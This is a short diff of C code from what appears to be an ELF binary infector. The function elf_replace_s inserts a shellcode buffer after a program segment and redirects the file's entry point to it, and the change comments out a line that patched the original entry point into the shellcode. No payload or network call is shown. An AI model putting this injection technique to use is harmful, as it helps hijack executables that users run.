@@ -81,8 +81,7 @@ void elf_replace_s(char **s, size_t *len, char *shellcode, int slen){
 	Elf64_Ehdr *h = (*s);
 	Elf64_Phdr *ph = (*s) + h->e_phoff;
 
-	//get entry point of shellcode:
-	*(int*)(shellcode + 0xab) = h->e_entry;
+	//*(int*)(shellcode + 0xab) = h->e_entry;
 
 	size_t pos = ph[x].p_offset + ph[x].p_filesz;
 	insert(s, len, pos, shellcode, slen);
@@ -90,6 +89,7 @@ void elf_replace_s(char **s, size_t *len, char *shellcode, int slen){
 	ph = (*s) + h->e_phoff;
 
 
+	//get entry point of shellcode:
 	size_t entry;
 	find_entry_in_file(shellcode, slen, &entry);
 	h->e_entry = ph[x].p_vaddr + ph[x].p_filesz + entry + 1;
